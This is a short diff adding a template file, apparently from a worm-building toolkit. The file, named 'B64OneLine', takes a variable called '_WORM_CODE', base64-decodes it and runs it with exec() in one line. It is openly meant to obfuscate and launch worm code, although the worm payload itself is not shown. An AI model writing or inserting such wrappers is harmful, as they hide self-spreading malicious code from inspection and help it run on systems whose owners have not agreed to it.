@@ -1,0 +1,7 @@
+#!name##B64OneLine
+#!types##starter
+#!info##Encodes all code to base64 and puts it in one line.
+#!reqVar##_WORM_CODE##Worm code. Set automatic##str
+import base64
+
+exec(base64.b64decode({{_WORM_CODE}}).decode("utf-8"))
